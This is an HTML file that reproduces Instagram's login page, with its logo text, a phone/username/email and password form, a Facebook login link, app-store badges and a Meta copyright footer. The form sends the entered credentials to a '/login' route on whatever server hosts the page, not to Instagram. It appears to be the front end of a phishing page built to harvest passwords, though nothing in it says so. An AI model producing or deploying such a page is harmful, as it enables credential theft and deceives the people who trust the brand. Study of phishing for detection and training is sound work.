<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Instagram</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/static/style1.css">
</head>
<body>
    <div class="login-container">
        <div class="login-box">
            <h1 class="logo">Instagram</h1>
            <form method="POST" action="/login">
                <input type="text" name="username" placeholder="Phone number, username, or email" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log in</button>
            </form>
            <div class="divider">OR</div>
            <a class="facebook-login" href="#">Log in with Facebook</a>
            <a class="forgot-pass" href="#">Forgot password?</a>
        </div>

        <div class="signup-box">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>

        <div class="get-app">
            <p>Get the app.</p>
            <div class="app-buttons">
                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5f/Available_on_the_App_Store_(black)_SVG.svg" alt="App Store" height="40">
                <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play" height="40">
            </div>
        </div>

        <footer>
            <p>© 2025 Instagram from Meta</p>
        </footer>
    </div>
</body>
</html>
